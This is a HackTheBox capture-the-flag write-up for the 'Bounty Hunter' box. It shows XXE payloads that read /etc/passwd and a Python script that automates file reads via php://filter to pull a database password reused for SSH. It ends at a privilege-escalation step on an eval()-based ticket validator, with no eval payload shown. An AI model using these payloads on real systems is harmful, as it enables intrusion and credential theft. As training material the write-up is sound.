---
title: Bounty Hunter
date: 2026-03-10
tags: ctf, hackthebox, easy, XXE
excerpt: XXE Injection, EVAl Injection, Bounty Hunting
---

### Recon

### nmap

```python
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```nix
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration

### Port 80 `HTTP`

```nix
http://10.10.11.100/ [200 OK] 
Apache[2.4.41],
Bootstrap, 
Country[RESERVED][ZZ],
HTML5, 
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
IP[10.10.11.100],
JQuery, Script, Title[Bounty Hunters]

```

Directory Listing

```nix
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389, Dur 
resources               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 275
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 
```

`index.php`


![screenshot_from_2023-06-09_20-15-04.png](/blog/posts/images/bounty-hunter/screenshot_from_2023-06-09_20-15-04.png)


`/resources`


![screenshot_2023-06-09_at_17-17-39_index_of__resources.png](/blog/posts/images/bounty-hunter/screenshot_2023-06-09_at_17-17-39_index_of__resources.png)


`README.txt`

```nix
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permission
```

`/portal.php`


![screenshot_2023-06-09_at_17-23-03_screenshot.png](/blog/posts/images/bounty-hunter/screenshot_2023-06-09_at_17-23-03_screenshot.png)


We follow the links which leads to `/log_submit.php`


![screenshot_2023-06-09_at_17-20-08_screenshot.png](/blog/posts/images/bounty-hunter/screenshot_2023-06-09_at_17-20-08_screenshot.png)


We submit random data and capture the request with burp suite interceptor

```nix
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 229
Origin: http://10.10.11.100
DNT: 1
Connection: close
Referer: http://10.10.11.100/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5wb2xraXQ8L3RpdGxlPgoJCTxjd2U%2BNDIwPC9jd2U%2BCgkJPGN2c3M%2BNi45PC9jdnNzPgoJCTxyZXdhcmQ%2BMTMzNzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
```

We can see the `data` is sent to the DB encoded in `URL encoding` and then in `base64`  which is decoded and translated to `XML` data:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>polkit</title>
		<cwe>420</cwe>
		<cvss>6.9</cvss>
		<reward>1337</reward>
		</bugreport>
```

We can try a simple `XXE injection` to trigger the vulnerability

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>CWE</cwe>
		<cvss>9.8</cvss>
		<reward>1,000,000</reward>
		</bugreport>
```

And we get a file read:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

We can now read the `db.php` file using `php://filter/convert.base64-encode/resource=` using 0xdf python script.

```python
#!/usr/bin/env python3

import requests
import sys
from base64 import b64encode, b64decode

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} filename")
    sys.exit()

xxe = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={sys.argv[1]}" >]>
                <bugreport>
                <title>&xxe;</title>
                <cwe>CWE</cwe>
                <cvss>9.8</cvss>
                <reward>1,000,000</reward>
                </bugreport>"""

payload = b64encode(xxe.encode())

resp = requests.post('http://10.10.11.100/tracker_diRbPr00f314.php',
        data = {'data': payload},
        proxies = {'http': 'http://127.0.0.1:8080'})

encoded_result = '>'.join(resp.text.split('>')[5:-21])[:-4]
result = b64decode(encoded_result)
print(result.decode())
```

### Credentials

```php
python3 automate.py /var/www/html/db.php

<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

We can attempt using the password against user `development` on `ssh` and it works.

### Root

`sudo -l`

```php
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

### eval injection
